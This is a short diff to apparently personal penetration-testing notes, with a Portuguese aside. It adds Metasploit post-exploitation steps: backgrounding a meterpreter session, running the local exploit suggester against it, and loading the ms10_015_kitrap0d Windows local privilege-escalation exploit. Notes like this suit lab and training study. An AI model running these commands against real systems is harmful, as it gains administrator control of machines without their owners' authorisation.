@@ -211,7 +211,13 @@ sysinfo
 
 getuid
 
-** escalate privileges:
+meterpreter > background**
 
-use multi/recon/local_exploi_suggester
+search suggester
 
+** escalate privileges: --------------------------
+
+post(multi/recon/local_exploit_suggester) > set SESSION 1
+( se falhar agora vira session 2)
+
+use windows/local/ms10_015_kitrap0d
